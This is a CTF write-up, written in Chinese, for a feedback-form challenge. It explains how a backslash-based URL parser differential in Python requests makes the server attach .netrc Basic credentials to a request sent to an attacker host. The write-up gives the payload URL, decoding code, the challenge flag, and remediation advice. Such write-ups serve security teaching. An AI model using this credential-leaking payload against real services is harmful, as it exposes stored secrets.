# GreyCTF 2026 Feedback Form

## 题目简述

题目是一个反馈表单。后端会从反馈文本中提取至多三个 HTTP(S) 链接，再用 Python `requests.get()` 访问链接，检查页面里是否包含负面词汇。容器同时配置了 `.netrc`：当目标主机是反馈站点时，请求会自动携带用户名 `flag` 和以 flag 为密码的 HTTP Basic 凭据。

直接提交攻击者地址不会命中 `.netrc`，直接提交反馈站点又无法把凭据送到外部。漏洞来自 `requests` 的两条处理链对反斜杠的解释不同：查找 `.netrc` 凭据时使用 `urllib.parse`，真正发出请求时由 `urllib3` 解析 URL。利用解析差异可以让前者看到受信任主机、后者却连接攻击者主机。

## 解题过程

服务端的核心逻辑可以简化为：

```python
LINK_RE = re.compile(r"https?://[^\s<>'\"]+")

for link in LINK_RE.findall(text)[:3]:
    requests.get(
        link.rstrip(".,;)]}"),
        headers={"User-Agent": "link checker"},
        timeout=3,
    )
```

`requests` 默认允许从 `.netrc` 补充认证信息。服务中的记录等价于：

```text
machine <trusted-feedback-host> login flag password <real-flag>
```

关键是比较两套解析器。`urllib.parse` 查找 authority 终点时只把 `/`、`?`、`#` 当作分隔符，并在完整 netloc 的最后一个 `@` 处分开 userinfo 和 host。于是对于：

```text
https://<attacker-host>\@<trusted-feedback-host>/
```

它看到的 netloc 仍是 `<attacker-host>\@<trusted-feedback-host>`，最后得到的主机名为 `<trusted-feedback-host>`，因此匹配 `.netrc` 并生成：

```http
Authorization: Basic base64("flag:<real-flag>")
```

而 `urllib3` 的 authority 正则明确排除了反斜杠。它会在 `\` 处结束 authority，把 `<attacker-host>` 作为真正的连接目标，并把 `\@<trusted-feedback-host>/` 规范化为路径。两条解析结果可以概括为：

```text
urllib.parse：host = <trusted-feedback-host>   -> 载入 .netrc 凭据
urllib3：     host = <attacker-host>           -> 请求实际发往攻击者
```

因此，在自己的 HTTP 日志接收端准备一个域名或子域名，然后向反馈框提交如下内容即可：

```text
https://<attacker-host>\@<trusted-feedback-host>/
```

后端的链接检查器访问该 URL 时，攻击者收到的请求会带上错误绑定的 `Authorization` 头。取出 `Basic` 后面的 Base64 字符串并解码：

```python
import base64

raw = base64.b64decode(observed_basic_token).decode()
username, password = raw.split(":", 1)
print(username)  # flag
print(password)  # leaked password
```

密码字段即为本题 flag：

```text
grey{please_tell_the_truth_in_the_actual_feedback_form}
```

页面中的标题图片只起界面装饰作用，不包含漏洞信息，因此没有保留为 WP 图片。

## 方法总结

本题不是普通 SSRF，而是“同一 URL 在凭据选择和网络连接阶段由不同解析器解释”的差分漏洞。排查此类问题时，不能只验证最终请求落到哪里，还要分别跟踪代理、重定向、认证、Cookie、签名等前置逻辑各自使用了哪套 URL 规范化规则。

反斜杠使 `.netrc` 凭据错误地绑定到攻击者请求，真正泄漏的是 HTTP Basic 头，而不是响应正文。修复时应在进入任何安全决策前使用同一套严格解析与规范化逻辑，拒绝 authority 中的反斜杠，并在自动携带凭据前再次校验最终连接主机。
